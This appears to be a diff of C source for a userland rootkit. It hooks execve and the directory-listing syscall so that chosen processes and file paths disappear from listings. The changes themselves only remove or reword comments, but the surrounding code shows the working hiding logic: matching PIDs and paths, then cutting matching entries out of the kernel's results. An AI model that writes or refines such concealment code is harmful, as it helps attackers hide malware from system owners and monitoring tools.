@@ -159,7 +159,7 @@ int execve(const char *pathname, char *const argv[], char *const envp[]) {
         should_hide_this_pid = 1;
     }
 
-    // BUG FIX: Also check all command-line arguments, not just the executable path.
+    // Also check all command-line arguments, not just the executable path.
     // This makes the hiding more robust.
     if (!should_hide_this_pid) {
         for (int i = 0; argv[i] != NULL; i++) {
@@ -215,8 +215,6 @@ long syscall(long number, ...) {
         long processed_bytes = 0;
         struct dirent* current_entry = dirp;
         while (processed_bytes < ret) {
-            // BUG FIX: Removed check for `current_entry->d_reclen == 0` as it can be unreliable.
-            // The main loop condition `processed_bytes < ret` is sufficient and more robust.
             
             int should_hide = 0;
             pid_t pid = atoi(current_entry->d_name);
@@ -224,7 +222,6 @@ long syscall(long number, ...) {
                 should_hide = 1;
             } else {
                 char full_path[PATH_MAX];
-                // BUG FIX: Replaced unsafe strcpy/strcat with snprintf to prevent buffer overflows.
                 snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, current_entry->d_name);
                 
                 if (should_hide_path(full_path)) {
@@ -237,7 +234,7 @@ long syscall(long number, ...) {
                 long remaining_bytes = ret - (processed_bytes + entry_len);
                 memmove(current_entry, (char*)current_entry + entry_len, remaining_bytes);
                 ret -= entry_len;
-                continue; // Do not increment processed_bytes as we've shifted the data
+                continue; 
             }
 
             processed_bytes += current_entry->d_reclen;
